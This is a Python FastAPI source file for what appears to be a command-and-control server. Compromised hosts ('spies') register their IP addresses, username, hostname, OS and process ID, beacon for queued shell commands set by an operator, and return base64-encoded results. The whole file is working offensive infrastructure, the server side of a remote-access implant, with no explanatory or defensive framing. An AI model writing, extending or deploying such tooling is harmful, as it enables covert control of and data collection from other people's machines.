from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import itertools
import random
import string
from datetime import datetime
import base64

class RegisterRequest(BaseModel):
    intaddr: str
    extaddr: str
    username: str
    hostname: str
    ops: str
    pid: int

class BeaconRequest(BaseModel):
    id: int
    active: bool

class ResultRequest(BaseModel):
    command: str
    result: str


class Spy:
    newId = itertools.count(start=1)

    def __init__(self):
        self.id = next(self.newId)
        self.guid = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
        self.active = False
        self.intaddr = None
        self.extaddr = None
        self.username = None
        self.hostname = None
        self.ops = None
        self.pid = None
        self.mission = None
        self.firstcheckin = None
        self.lastcheckin = None
        self.output = ""

    def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid):
        self.active = True
        self.intaddr = intaddr
        self.extaddr = extaddr
        self.username = username
        self.hostname = hostname
        self.ops = ops
        self.pid = pid
        self.firstcheckin = datetime.now()
        self.lastcheckin = self.firstcheckin
        self.output = ""

    def checkin(self):
        self.lastcheckin = datetime.now()
        if self.mission is not None and self.mission == 'kill':
            self.active = False

spies = []
app = FastAPI()

@app.post("/register")
async def register(request: RegisterRequest):
    newspy = Spy()
    newspy.initial_checkin(request.intaddr, request.extaddr, request.username, request.hostname, request.ops, request.pid)
    spies.append(newspy)
    return newspy.__dict__

@app.post("/beacon")
async def beacon(request: BeaconRequest):
    spy = next((s for s in spies if s.id == request.id), None)
    if spy:
        spy.active = request.active
        spy.lastcheckin = datetime.now()
        if spy.mission:
            mission = spy.mission
            spy.mission = None
            return {"command": mission}
        return {"command": None}
    raise HTTPException(status_code=404, detail="Spy not found")


@app.get("/spies")
async def list_spies():
    return [spy.__dict__ for spy in spies]

@app.get("/spy/{spy_id}")
async def get_spy(spy_id: int):
    spy = next((s for s in spies if s.id == spy_id), None)
    if spy:
        return spy.__dict__
    raise HTTPException(status_code=404, detail="Spy not found")

@app.get("/cls/{spy_id}")
async def clean_output(spy_id: int):
    spy = next((s for s in spies if s.id == spy_id), None)
    if spy:
        spy.output = ""
        return {"message": "Output cleared"}
    raise HTTPException(status_code=404, detail="Spy not found")

@app.get("/mission/{spy_id}/{command}")
async def receive_mission(spy_id: int, command: str):
    spy = next((s for s in spies if s.id == spy_id), None)
    if spy:
        if spy.mission is not None:
            return {"message": "The mission queue is full, please wait for the execution of current mission"}
        spy.mission = command
        return {"message": f"Mission updated for spy {spy.guid}"}
    raise HTTPException(status_code=404, detail="Spy not found")


@app.post("/result/{spy_id}")
async def get_result(spy_id: int, request: ResultRequest):
    spy = next((s for s in spies if s.id == spy_id), None)
    if spy:
        result = request.result
        result_bytes = result.encode("ascii") 
        string_bytes = base64.b64decode(result_bytes)
        raw = string_bytes.decode("ascii")
        output = f"Command: {request.command}\nResult: {raw}"
        spy.output = output
        print(output)
        return {"message": "Result received"}
    raise HTTPException(status_code=404, detail="Spy not found")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
